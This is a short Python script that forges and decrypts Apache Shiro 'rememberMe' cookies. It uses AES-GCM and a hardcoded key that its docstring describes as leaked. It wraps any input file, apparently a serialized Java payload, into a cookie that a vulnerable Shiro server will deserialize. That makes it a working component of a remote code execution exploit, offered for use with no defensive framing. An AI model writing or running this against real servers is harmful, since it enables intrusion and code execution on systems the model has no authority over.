#!/usr/bin/env python3
"""Build Shiro rememberMe cookie for Shiro >=1.4.2: AES-GCM (16B iv || ct || 16B tag), no padding.
Key: leaked n5RYm2z1V60+D+OiNLXksQ==."""
import base64
import sys

from Crypto.Cipher import AES

KEY = base64.b64decode("n5RYm2z1V60+D+OiNLXksQ==")


def encrypt(data: bytes) -> str:
    iv = b"\x04" * 16
    c = AES.new(KEY, AES.MODE_GCM, nonce=iv, mac_len=16)
    ct, tag = c.encrypt_and_digest(data)  # GCM streaming: no padding
    return base64.b64encode(iv + ct + tag).decode()


def decrypt(cookie: bytes) -> bytes:
    c = AES.new(KEY, AES.MODE_GCM, nonce=cookie[:16], mac_len=16)
    return c.decrypt_and_verify(cookie[16:-16], cookie[-16:])


if __name__ == "__main__":
    if sys.argv[1] == "e":
        print(encrypt(open(sys.argv[2], "rb").read()))
    else:
        sys.stdout.buffer.write(decrypt(open(sys.argv[2], "rb").read()))
